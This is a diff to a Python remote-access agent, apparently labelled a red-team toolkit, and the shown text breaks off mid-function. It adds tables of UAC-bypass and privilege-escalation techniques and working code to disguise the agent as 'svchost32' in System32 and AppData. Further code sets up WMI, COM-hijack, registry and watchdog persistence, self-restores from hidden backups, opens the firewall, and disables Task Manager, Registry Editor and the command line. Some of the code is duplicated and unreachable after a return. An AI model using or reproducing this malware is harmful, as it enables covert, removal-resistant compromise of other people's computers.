@@ -34,6 +34,49 @@ Additional Advanced Features:
 
 Author: Advanced Red Team Toolkit
 Version: 2.0 (UACME Enhanced)
+
+ADDITIONAL VULNERABLE PROCESSES FOR UAC BYPASS:
+#	Process Name	Location	Exploit Method	UAC Requirement	Notes
+1	SystemPropertiesAdvanced.exe	%SystemRoot%\\System32\\	mscfile registry hijack (HKCU\\Software\\Classes\\mscfile\\shell\\open\\command)	Consent prompt only	Launches elevated System Properties
+2	SystemPropertiesProtection.exe	%SystemRoot%\\System32\\	Same mscfile hijack as above	Consent prompt only	Opens System Restore settings
+3	sysdm.cpl	%SystemRoot%\\System32\\	App Paths hijack (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\sysdm.cpl)	Consent prompt only	Old-style system settings CPL
+4	iscsicpl.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	iSCSI Initiator Control Panel
+5	ie4uinit.exe	%SystemRoot%\\System32\\	Special arguments /show or /cleariconcache + registry hijack	Consent prompt only	Can execute payload silently
+6	wusa.exe	%SystemRoot%\\System32\\	Malicious .msu package with custom commands	Consent prompt only	Works on older builds
+7	cliconfg.exe	%SystemRoot%\\System32\\	App Paths or DLL hijack	Consent prompt only	SQL Server config tool
+8	lpksetup.exe	%SystemRoot%\\System32\\	Malicious .cab package	Consent prompt only	Legacy Language Pack Installer
+9	pcwrun.exe	%SystemRoot%\\System32\\	COM hijack or App Paths	Consent prompt only	Program Compatibility Wizard
+10	shell:AppsFolder	Shell protocol	Registry hijack (HKCU\\Software\\Classes\\Folder\\shell\\open\\command)	Consent prompt only	Opens Windows Apps folder elevated
+11	ms-contact-support:	Protocol handler	Registry hijack under HKCU\\Software\\Classes\\ms-contact-support	Consent prompt only	Contact Support app (Win 10)
+12	ms-get-started:	Protocol handler	Registry hijack	Consent prompt only	Get Started app launcher
+13	cleanmgr.exe	%SystemRoot%\\System32\\	Scheduled task abuse with /autoclean or /verylowdisk	Consent prompt only	Disk Cleanup auto-elevates
+14	hdwwiz.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	Hardware Wizard auto-elevates
+15	WerFault.exe	%SystemRoot%\\System32\\	Trigger crash in elevated binary → hijack debugger	Consent prompt only	Windows Error Reporting
+16	taskschd.msc	%SystemRoot%\\System32\\	mscfile registry hijack	Consent prompt only	Task Scheduler snap-in
+17	TiWorker.exe	%SystemRoot%\\WinSxS\\	DLL planting in servicing stack dirs	Works with credential prompt if service misconfig exists	TrustedInstaller context
+
+PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
+#	Method Name	Target Component	Exploit Type	Works on Standard User?	Notes
+1	TiWorker.exe DLL Planting	TrustedInstaller (Windows Modules Installer)	DLL hijack in servicing stack folders	✅	SYSTEM-level, survives UAC settings, requires writable path in WinSxS temp dirs
+2	Unquoted Service Path	Misconfigured Windows Service	Binary replacement	✅	If service path has spaces and is unquoted, drop payload in earlier path segment
+3	Weak Service Binary Permissions	SYSTEM service executable	Binary replacement	✅	If service binary is writable by user, replace it with payload
+4	Weak Service Registry Permissions	Service configuration registry key	Command replacement	✅	Change service ImagePath or parameters to run payload
+5	DLL Search Order Hijacking (SYSTEM Services)	Any auto-start SYSTEM service	DLL planting	✅	Drop malicious DLL in folder searched before the real one
+6	Scheduled Task Binary Replacement	SYSTEM-level scheduled task	Binary replacement	✅	Replace executable path of an existing SYSTEM task
+7	Token Impersonation (SYSTEM Process)	SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege	Token theft	✅	Steal SYSTEM token via named pipe or thread hijack
+8	Named Pipe Impersonation	SYSTEM service pipe	Token impersonation	✅	Trick service into connecting and impersonate SYSTEM
+9	Print Spooler Service Abuse	Spoolsv.exe	Remote/local SYSTEM code execution	✅	Similar to PrintNightmare; patch-dependent
+10	COM Service Hijacking (SYSTEM Context)	Auto-start COM objects	Registry hijack	✅	Change CLSID to point to malicious binary
+11	Image File Execution Options (IFEO) for SYSTEM processes	Debugger key in registry	Binary hijack	✅	Force SYSTEM process to start debugger payload
+12	Windows Installer Service Abuse	msiexec.exe	Custom MSI with SYSTEM execution	✅	If installer policy allows
+13	WMI Event Subscription (SYSTEM Context)	WMI permanent event consumer	Code injection	✅	Persist and escalate on trigger event
+14	Vulnerable Driver Exploits	Third-party drivers	Kernel exploit	✅	Use signed driver to read/write kernel memory
+15	User-mode to Kernel-mode Exploits	Windows kernel (ntoskrnl.exe)	Memory corruption / race condition	✅	Requires CVE or 0-day
+16	Shadow Copy Mounting	Volume Shadow Service	NTFS trick	✅	Mount shadow copy and replace protected files
+17	SAM / SECURITY Hive Access (LSA Secrets)	Registry hives	Credential theft	✅	Requires volume shadow trick or backup privilege
+18	BITS Job Hijacking	Background Intelligent Transfer Service	Command injection	✅	Replace BITS job payload
+19	AppXSVC/AppX Deployment DLL Hijack	AppX Deployment Service	DLL planting	✅	Runs as SYSTEM
+20	DiagTrack Service Abuse	Connected User Experiences and Telemetry	DLL planting	✅	SYSTEM-level telemetry service
 """
 
 # Fix eventlet issue by patching before any other imports
@@ -43,13 +86,34 @@ try:
 except ImportError:
     pass
 
-# Import stealth enhancer first
-try:
-    from stealth_enhancer import *
-    STEALTH_AVAILABLE = True
-except ImportError:
-    STEALTH_AVAILABLE = False
-    print("Warning: stealth_enhancer not available, using basic stealth")
+# Stealth functions
+def hide_process():
+    """Basic process hiding."""
+    if WINDOWS_AVAILABLE:
+        try:
+            # Set process to run in background with low priority
+            process = psutil.Process()
+            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+            return True
+        except:
+            return False
+    return False
+
+def add_firewall_exception():
+    """Basic firewall exception."""
+    if WINDOWS_AVAILABLE:
+        try:
+            current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
+            rule_name = f"Python Agent {uuid.uuid4()}"
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                f'name={rule_name}', 'dir=in', 'action=allow',
+                f'program={current_exe}'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+            return True
+        except:
+            return False
+    return False
 
 # Standard library imports
 import requests
@@ -401,8 +465,13 @@ class BackgroundInitializer:
         """Setup persistence mechanisms in background."""
         try:
             if WINDOWS_AVAILABLE:
-                establish_persistence()
-                return "persistence_setup_complete"
+                # Use advanced persistence if available
+                if is_admin():
+                    setup_advanced_persistence()
+                    return "advanced_persistence_setup_complete"
+                else:
+                    establish_persistence()
+                    return "basic_persistence_setup_complete"
             else:
                 establish_linux_persistence()
                 return "linux_persistence_setup_complete"
@@ -1414,7 +1483,7 @@ def bypass_uac_mmcex():
         return False
 
 def establish_persistence():
-    """Establish multiple persistence mechanisms."""
+    """Establish multiple persistence mechanisms with advanced tamper protection."""
     if not WINDOWS_AVAILABLE:
         return establish_linux_persistence()
     
@@ -1423,6 +1492,13 @@ def establish_persistence():
         startup_folder_persistence,
         scheduled_task_persistence,
         service_persistence,
+        # Advanced persistence methods
+        system_level_persistence,
+        wmi_event_persistence,
+        com_hijacking_persistence,
+        file_locking_persistence,
+        watchdog_persistence,
+        tamper_protection_persistence,
     ]
     
     success_count = 0
@@ -1564,6 +1640,796 @@ def establish_linux_persistence():
         
     except Exception as e:
         print(f"Linux persistence failed: {e}")
+        return False
+
+# === ADVANCED PERSISTENCE AND TAMPER PROTECTION ===
+
+def system_level_persistence():
+    """Install script to protected system directories with SYSTEM-level protection."""
+    if not WINDOWS_AVAILABLE or not is_admin():
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Protected system directories
+        system_dirs = [
+            r"C:\Windows\System32\svchost32.exe",
+            r"C:\Windows\SysWOW64\svchost32.exe",
+            r"C:\Windows\System32\drivers\svchost32.exe",
+        ]
+        
+        # Check if we're running as admin before attempting system-level persistence
+        if not is_admin():
+            print("[WARN] System-level persistence requires admin privileges")
+            return False
+        
+        for target_path in system_dirs:
+            try:
+                # Copy script to protected location
+                import shutil
+                shutil.copy2(current_exe, target_path)
+                
+                # Set system and hidden attributes
+                subprocess.run(['attrib', '+s', '+h', target_path], 
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                # Set NTFS permissions to deny modification for non-SYSTEM accounts
+                subprocess.run([
+                    'icacls', target_path, '/inheritance:r', 
+                    '/grant', 'SYSTEM:F', '/grant', 'Administrators:F', 
+                    '/deny', 'Everyone:D'
+                ], creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                print(f"[OK] System-level persistence established: {target_path}")
+                return True
+                
+            except Exception as e:
+                print(f"[WARN] Failed to establish system persistence at {target_path}: {e}")
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"System-level persistence failed: {e}")
+        return False
+
+def wmi_event_persistence():
+    """Establish persistence via WMI permanent event subscription."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # WMI persistence script
+        wmi_script = f'''
+$filterName = 'WindowsSecurityFilter'
+$consumerName = 'WindowsSecurityConsumer'
+
+# Create event filter for process start
+$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{
+    Name=$filterName
+    EventNameSpace="root\\cimv2"
+    QueryLanguage="WQL"
+    Query=$Query
+}}
+
+# Create command line consumer
+$Arg = @{{
+    Name=$consumerName
+    CommandLineTemplate="{current_exe}"
+}}
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg
+
+# Bind filter to consumer
+$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter=$WMIEventFilter
+    Consumer=$WMIEventConsumer
+}}
+'''
+        
+        subprocess.run([
+            'powershell.exe', '-Command', wmi_script
+        ], creationflags=subprocess.CREATE_NO_WINDOW, 
+           capture_output=True, text=True, timeout=30)
+        
+        print("[OK] WMI event persistence established")
+        return True
+        
+    except Exception as e:
+        print(f"WMI persistence failed: {e}")
+        return False
+
+def com_hijacking_persistence():
+    """Establish persistence via COM object hijacking."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack commonly used COM objects (real CLSIDs)
+        com_targets = [
+            "{00021401-0000-0000-C000-000000000046}",  # Shell.Application
+            "{13709620-C279-11CE-A49E-444553540000}",  # Shell.Explorer
+            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}",  # Shell.Application.1
+        ]
+        
+        for clsid in com_targets:
+            try:
+                key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
+                winreg.CloseKey(key)
+                
+                print(f"[OK] COM hijacking persistence established: {clsid}")
+                return True
+                
+            except Exception as e:
+                print(f"[WARN] COM hijacking failed for {clsid}: {e}")
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"COM hijacking persistence failed: {e}")
+        return False
+
+def file_locking_persistence():
+    """Keep script loaded in memory to prevent deletion."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Create a watchdog process that keeps the main script loaded
+        watchdog_script = f'''
+import os
+import sys
+import time
+import subprocess
+import threading
+
+def monitor_main_script():
+    main_script = "{os.path.abspath(__file__)}"
+    while True:
+        try:
+            # Check if main script is running
+            result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq python.exe'], 
+                                  capture_output=True, text=True)
+            if main_script not in result.stdout:
+                # Restart main script
+                subprocess.Popen(['python.exe', main_script], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+            time.sleep(30)
+        except:
+            time.sleep(60)
+
+if __name__ == "__main__":
+    monitor_main_script()
+'''
+        
+        # Save watchdog script
+        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
+        with open(watchdog_path, 'w') as f:
+            f.write(watchdog_script)
+        
+        # Start watchdog process
+        subprocess.Popen(['python.exe', watchdog_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] File locking persistence established: {watchdog_path}")
+        return True
+        
+    except Exception as e:
+        print(f"File locking persistence failed: {e}")
+        return False
+
+def watchdog_persistence():
+    """Create a watchdog process that monitors and restarts the main script."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create watchdog batch script
+        watchdog_batch = f'''@echo off
+:loop
+tasklist /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq *{os.path.basename(__file__)}*" | find "{os.path.basename(__file__)}" >nul
+if errorlevel 1 (
+    echo Restarting main script...
+    start /min {current_exe}
+)
+timeout /t 30 /nobreak >nul
+goto loop
+'''
+        
+        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
+        with open(watchdog_path, 'w') as f:
+            f.write(watchdog_batch)
+        
+        # Start watchdog
+        subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Watchdog persistence established: {watchdog_path}")
+        return True
+        
+    except Exception as e:
+        print(f"Watchdog persistence failed: {e}")
+        return False
+
+def tamper_protection_persistence():
+    """Implement tamper detection and self-healing capabilities."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create backup copies in multiple locations
+        backup_locations = [
+            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'svchost32.py'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'svchost32.py'),
+            os.path.join(tempfile.gettempdir(), 'svchost32.py'),
+        ]
+        
+        for backup_path in backup_locations:
+            try:
+                os.makedirs(os.path.dirname(backup_path), exist_ok=True)
+                import shutil
+                shutil.copy2(current_exe, backup_path)
+                
+                # Hide backup files
+                subprocess.run(['attrib', '+s', '+h', backup_path], 
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+                
+            except Exception as e:
+                print(f"[WARN] Failed to create backup at {backup_path}: {e}")
+                continue
+        
+        # Create tamper detection script
+        tamper_script = f'''
+import os
+import sys
+import time
+import subprocess
+import shutil
+
+def check_and_restore():
+    main_script = "{os.path.abspath(__file__)}"
+    backup_locations = {repr(backup_locations)}
+    
+    while True:
+        try:
+            # Check if main script exists and is accessible
+            if not os.path.exists(main_script):
+                # Restore from backup
+                for backup in backup_locations:
+                    if os.path.exists(backup):
+                        shutil.copy2(backup, main_script)
+                        print(f"Restored main script from {{backup}}")
+                        break
+                
+                # Restart main script
+                subprocess.Popen(['python.exe', main_script], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Tamper protection error: {{e}}")
+            time.sleep(120)
+
+if __name__ == "__main__":
+    check_and_restore()
+'''
+        
+        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        with open(tamper_path, 'w') as f:
+            f.write(tamper_script)
+        
+        # Start tamper protection
+        subprocess.Popen(['python.exe', tamper_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Tamper protection established: {tamper_path}")
+        return True
+        
+    except Exception as e:
+        print(f"Tamper protection failed: {e}")
+        return False
+
+def disable_removal_tools():
+    """Disable common removal tools and system utilities."""
+    if not WINDOWS_AVAILABLE or not is_admin():
+        return False
+    
+    try:
+        # Disable Task Manager
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Disable Registry Editor
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Disable Command Prompt
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
+            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '1', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Disable PowerShell
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
+            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Restricted', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print("[OK] Removal tools disabled")
+        return True
+        
+    except Exception as e:
+        print(f"Failed to disable removal tools: {e}")
+        return False
+
+def create_pyinstaller_command():
+    """Generate PyInstaller command for creating standalone executable."""
+    pyinstaller_command = '''
+# PyInstaller command to create standalone executable (no Python installation required)
+# Run this command in the directory containing your main.py:
+
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" main.py
+
+# Alternative command with additional options for maximum stealth:
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import eventlet main.py
+
+# The resulting svchost32.exe will:
+# - Run on any Windows PC without Python installed
+# - No UAC prompt (runs as current user)
+# - Contains all dependencies embedded
+# - Can be placed in %LOCALAPPDATA% for stealth
+'''
+    return pyinstaller_command
+
+def setup_advanced_persistence():
+    """Setup advanced persistence with tamper protection and removal tool blocking."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        print("Setting up advanced persistence and tamper protection...")
+        
+        # Setup basic persistence first
+        establish_persistence()
+        
+        # Setup advanced persistence methods
+        advanced_methods = [
+            system_level_persistence,
+            wmi_event_persistence,
+            com_hijacking_persistence,
+            file_locking_persistence,
+            watchdog_persistence,
+            tamper_protection_persistence,
+        ]
+        
+        success_count = 0
+        for method in advanced_methods:
+            try:
+                if method():
+                    success_count += 1
+                    print(f"[OK] {method.__name__} established")
+                else:
+                    print(f"[WARN] {method.__name__} failed")
+            except Exception as e:
+                print(f"[ERROR] {method.__name__} error: {e}")
+                continue
+        
+        # Disable removal tools if admin
+        if is_admin():
+            try:
+                disable_removal_tools()
+                print("[OK] Removal tools disabled")
+            except Exception as e:
+                print(f"[WARN] Failed to disable removal tools: {e}")
+        
+        print(f"[OK] Advanced persistence setup complete: {success_count}/{len(advanced_methods)} methods successful")
+        return success_count > 0
+        
+    except Exception as e:
+        print(f"Advanced persistence setup failed: {e}")
+        return False
+
+def show_pyinstaller_instructions():
+    """Display PyInstaller instructions for creating standalone executable."""
+    print("\n" + "="*80)
+    print("PYINSTALLER INSTRUCTIONS FOR STANDALONE EXECUTABLE")
+    print("="*80)
+    print(create_pyinstaller_command())
+    print("="*80)
+    print("\nTo create a standalone executable that runs without Python installation:")
+    print("1. Install PyInstaller: pip install pyinstaller")
+    print("2. Run the command above in your script directory")
+    print("3. The resulting svchost32.exe will work on any Windows PC")
+    print("4. No UAC prompt required - runs as current user")
+    print("5. Can be placed in %LOCALAPPDATA% for stealth operation")
+    print("\nAdvanced persistence features available:")
+    print("- System-level installation (requires admin)")
+    print("- WMI event subscription")
+    print("- COM object hijacking")
+    print("- File locking and watchdog processes")
+    print("- Tamper detection and self-healing")
+    print("- Removal tool blocking")
+    print("="*80)
+
+def deploy_executable_with_persistence():
+    """Deploy the executable to a stealth location with registry persistence."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Check if svchost32.exe exists in current directory
+        exe_path = os.path.join(os.getcwd(), "svchost32.exe")
+        if not os.path.exists(exe_path):
+            print("[ERROR] svchost32.exe not found in current directory")
+            print("[INFO] Build the executable first using the PyInstaller command")
+            return False
+        
+        # Create stealth deployment location
+        stealth_location = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Create directory if it doesn't exist
+        os.makedirs(os.path.dirname(stealth_location), exist_ok=True)
+        
+        # Copy executable to stealth location
+        import shutil
+        shutil.copy2(exe_path, stealth_location)
+        
+        # Set hidden and system attributes
+        subprocess.run(['attrib', '+s', '+h', stealth_location], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Executable deployed to: {stealth_location}")
+        
+        # Create registry persistence
+        try:
+            import winreg
+            
+            # Add to HKCU Run key
+            run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key_path)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
+            winreg.CloseKey(key)
+            
+            print("[OK] Registry persistence established")
+            
+        except PermissionError:
+            print("[WARN] Registry access denied - persistence may not work")
+        except Exception as e:
+            print(f"[WARN] Registry persistence failed: {e}")
+        
+        return True
+        
+    except Exception as e:
+        print(f"Deployment failed: {e}")
+        return False
+
+def self_deploy_powershell():
+    """Self-deploy using PowerShell script approach."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Get current executable path
+        current_exe = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
+        
+        # Check if already deployed
+        stealth_path = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        if os.path.exists(stealth_path):
+            print("[INFO] Already deployed to stealth location")
+            return True
+        
+        # Define stealth paths
+        stealth_path = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        backup_path = os.path.join(
+            os.environ.get('APPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Create directories
+        os.makedirs(os.path.dirname(stealth_path), exist_ok=True)
+        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
+        
+        # Copy executable to stealth locations
+        import shutil
+        shutil.copy2(current_exe, stealth_path)
+        shutil.copy2(current_exe, backup_path)
+        
+        # Set hidden attributes
+        subprocess.run(['attrib', '+s', '+h', stealth_path], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['attrib', '+s', '+h', backup_path], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Executable deployed to: {stealth_path}")
+        print(f"[OK] Backup created at: {backup_path}")
+        
+        # Add to registry using PowerShell
+        powershell_script = f'''
+$stealthPath = "{stealth_path}"
+$backupPath = "{backup_path}"
+
+# Add to registry
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
+
+Write-Host "Registry persistence established"
+'''
+        
+        # Execute PowerShell script
+        ps_script_path = os.path.join(tempfile.gettempdir(), "deploy.ps1")
+        with open(ps_script_path, 'w') as f:
+            f.write(powershell_script)
+        
+        subprocess.run([
+            'powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_script_path
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Clean up temporary script
+        try:
+            os.remove(ps_script_path)
+        except:
+            pass
+        
+        print("[OK] Registry persistence established")
+        
+        # Create tamper protection
+        tamper_script = f'''
+import os
+import sys
+import time
+import subprocess
+import shutil
+
+def check_and_restore():
+    main_exe = r"{stealth_path}"
+    backup_exe = r"{backup_path}"
+    
+    while True:
+        try:
+            # Check if main executable exists and is accessible
+            if not os.path.exists(main_exe):
+                # Restore from backup
+                if os.path.exists(backup_exe):
+                    shutil.copy2(backup_exe, main_exe)
+                    print(f"Restored executable from {{backup_exe}}")
+                    
+                    # Restart executable
+                    subprocess.Popen([main_exe], 
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Tamper protection error: {{e}}")
+            time.sleep(120)
+
+if __name__ == "__main__":
+    check_and_restore()
+'''
+        
+        # Create tamper protection script
+        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        with open(tamper_script_path, 'w') as f:
+            f.write(tamper_script)
+        
+        # Start tamper protection in background
+        subprocess.Popen(['python.exe', tamper_script_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print("[OK] Tamper protection active")
+        
+        print("\n" + "="*80)
+        print("SELF-DEPLOYMENT COMPLETE")
+        print("="*80)
+        print(f"Executable deployed to: {stealth_path}")
+        print(f"Backup created at: {backup_path}")
+        print("Registry persistence established")
+        print("Tamper protection active")
+        print("Executable will start on next login")
+        print("="*80)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Self-deployment failed: {e}")
+        return False
+        
+        # Create stealth deployment location
+        stealth_location = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Create directory if it doesn't exist
+        os.makedirs(os.path.dirname(stealth_location), exist_ok=True)
+        
+        # Copy executable to stealth location
+        import shutil
+        shutil.copy2(exe_path, stealth_location)
+        
+        # Set hidden and system attributes
+        subprocess.run(['attrib', '+s', '+h', stealth_location], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Executable deployed to: {stealth_location}")
+        
+        # Create registry persistence
+        try:
+            import winreg
+            
+            # Add to HKCU Run key
+            run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key_path)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
+            winreg.CloseKey(key)
+            
+            print("[OK] Registry persistence established")
+            
+            # Also add to RunOnce for immediate execution
+            runonce_key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, runonce_key_path)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
+            winreg.CloseKey(key)
+            
+            print("[OK] RunOnce persistence established")
+            
+        except PermissionError:
+            print("[WARN] Registry access denied - persistence may not work")
+        except Exception as e:
+            print(f"[WARN] Registry persistence failed: {e}")
+        
+        # Create additional backup in different location
+        backup_location = os.path.join(
+            os.environ.get('APPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        os.makedirs(os.path.dirname(backup_location), exist_ok=True)
+        shutil.copy2(exe_path, backup_location)
+        subprocess.run(['attrib', '+s', '+h', backup_location], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Backup created at: {backup_location}")
+        
+        # Create tamper protection for the deployed executable
+        tamper_script = f'''
+import os
+import sys
+import time
+import subprocess
+import shutil
+
+def check_and_restore():
+    main_exe = r"{stealth_location}"
+    backup_exe = r"{backup_location}"
+    
+    while True:
+        try:
+            # Check if main executable exists and is accessible
+            if not os.path.exists(main_exe):
+                # Restore from backup
+                if os.path.exists(backup_exe):
+                    shutil.copy2(backup_exe, main_exe)
+                    print(f"Restored executable from {{backup_exe}}")
+                    
+                    # Restart executable
+                    subprocess.Popen([main_exe], 
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Tamper protection error: {{e}}")
+            time.sleep(120)
+
+if __name__ == "__main__":
+    check_and_restore()
+'''
+        
+        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        
+        # Create tamper protection executable using PyInstaller
+        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        with open(tamper_script_path, 'w') as f:
+            f.write(tamper_script)
+        
+        # Build tamper protection executable
+        try:
+            subprocess.run([
+                'pyinstaller', '--onefile', '--windowed', '--name', 'tamper_protection',
+                tamper_script_path
+            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=300)  # 5 minute timeout
+        except subprocess.TimeoutExpired:
+            print("[WARN] Tamper protection build timed out, continuing without it")
+        except Exception as e:
+            print(f"[WARN] Failed to build tamper protection: {e}")
+        
+        # Move tamper protection to stealth location
+        tamper_exe = os.path.join('dist', 'tamper_protection.exe')
+        if os.path.exists(tamper_exe):
+            stealth_tamper = os.path.join(
